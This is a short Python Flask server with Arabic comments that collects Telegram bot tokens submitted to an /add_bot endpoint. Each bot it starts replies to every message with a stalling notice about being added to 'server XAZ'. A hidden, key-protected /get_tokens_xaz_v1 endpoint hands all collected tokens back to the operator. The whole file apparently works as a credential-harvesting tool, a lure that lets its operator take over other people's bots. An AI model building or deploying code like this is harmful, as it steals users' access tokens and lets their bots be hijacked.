from flask import Flask, request, jsonify
import telebot
import threading

app = Flask(__name__)

# تخزين البوتات
bots = {}

# مفتاح سري لاستعادة التوكنات
SECRET_KEY = "393720739ektorecegrkiddoridokdpdieoeproekehepetro3h2p3oo293o3y3y"  # استبدل هذا بمفتاح سري قوي

# دالة لبدء تشغيل البوت
def start_bot(token):
    bot_instance = telebot.TeleBot(token)

    @bot_instance.message_handler(func=lambda message: True)
    def handle_message(message):
        # الرد برسالة ثابتة فقط
        response_text = "**تم ارسال طلب للسرفر وقريبن سوف يتم اضافت هذا البوت لسرفر XAZ, يرجي الانتظار مهلة من زمن🤖**"
        bot_instance.reply_to(message, response_text, parse_mode='Markdown')

    # بدء الاستماع للرسائل
    bot_instance.polling(none_stop=True, skip_pending=True)

# API لإضافة توكن
@app.route('/add_bot', methods=['POST'])
def add_bot():
    data = request.json
    token = data.get('token')

    if not token:
        return jsonify({'error': 'Token is required'}), 400

    # تخزين البوت وبدء تشغيله
    bots[token] = {'status': 'active'}
    threading.Thread(target=start_bot, args=(token,)).start()

    return jsonify({'message': 'Bot added successfully', 'token': token})

# API لاستعادة جميع التوكنات باستخدام مفتاح سري
@app.route('/get_tokens_xaz_v1', methods=['GET'])
def get_tokens():
    # التحقق من المفتاح السري
    provided_key = request.args.get('key')
    if provided_key != SECRET_KEY:
        return jsonify({'error': 'Unauthorized'}), 401

    # إرجاع جميع التوكنات
    return jsonify({'tokens': list(bots.keys())})

# API لإيقاف جميع البوتات
@app.route('/stop_bots', methods=['POST'])
def stop_bots():
    # التحقق من المفتاح السري
    provided_key = request.json.get('key')
    if provided_key != SECRET_KEY:
        return jsonify({'error': 'Unauthorized'}), 401

    # إيقاف جميع البوتات
    for token in bots.keys():
        bot_instance = telebot.TeleBot(token)
        bot_instance.stop_polling()

    # مسح جميع التوكنات
    bots.clear()

    return jsonify({'message': 'All bots stopped successfully'})

# تشغيل سيرفر Flask
if __name__ == '__main__':
    app.run(port=5000)
